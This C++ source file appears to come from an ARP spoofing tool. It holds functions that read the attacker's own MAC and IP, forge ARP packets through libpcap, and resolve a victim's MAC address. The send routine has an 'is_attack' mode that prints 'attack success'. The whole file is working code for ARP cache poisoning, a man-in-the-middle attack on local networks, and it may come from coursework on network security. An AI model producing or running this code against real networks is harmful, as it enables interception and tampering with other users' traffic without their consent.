#include <cstdio>
#include "arp-spoof.h"

void get_attacker_mac(char* dev, Mac* my_mac) {
	struct ifreq ifr;
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
	ioctl(s, SIOCGIFHWADDR, &ifr);
	*my_mac = Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
	printf("Attacker Mac: %s\n", std::string(*my_mac).c_str());
}

void get_attacker_ip(char* dev, Ip* my_ip) {
	struct ifreq ifr;
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
	ioctl(s, SIOCGIFADDR, &ifr);
	*my_ip = Ip(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
	printf("Attacker IP: %s\n", std::string(*my_ip).c_str());
}

void send_arp(pcap_t* handle, Mac destination_mac, Mac source_mac, uint16_t op, Mac sender_mac, Ip sender_ip, Mac target_mac, Ip target_ip, bool is_attack) {
	EthArpPacket packet;
	packet.eth_.dmac_ = destination_mac;
	packet.eth_.smac_ = source_mac;
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(op);
	packet.arp_.smac_ = sender_mac;
	packet.arp_.sip_ = htonl(sender_ip);
	packet.arp_.tmac_ = target_mac;
	packet.arp_.tip_ = htonl(target_ip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	else {
        is_attack ? printf("attack success\n") : printf("send packet success\n");
	}
}

Mac get_sender_mac(pcap_t* handle, Mac attacker_mac, Ip attacker_ip, Ip sender_ip, int message) {
    Mac sender_mac;
    
    send_arp(handle, Mac("ff:ff:ff:ff:ff:ff"), attacker_mac, ArpHdr::Request , attacker_mac, attacker_ip, Mac("00:00:00:00:00:00"), sender_ip, false);

    while(true) {
        struct pcap_pkthdr* header;
        const u_char* send_packet;
        int res = pcap_next_ex(handle, &header, &send_packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        EthArpPacket* original_packet = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(send_packet));

        if(original_packet->eth_.type_ != htons(EthHdr::Arp)) continue;
        if(original_packet->arp_.op_ != htons(ArpHdr::Reply)) continue;
        if(original_packet->arp_.sip_!= htonl(sender_ip)) continue;


        sender_mac = original_packet->arp_.smac_;
		if(message == 0) printf("%s: %s\n", "Sender Mac", std::string(sender_mac).c_str());
		else printf("%s: %s\n", "Target Mac", std::string(sender_mac).c_str());

        break;
    }

    return sender_mac;
}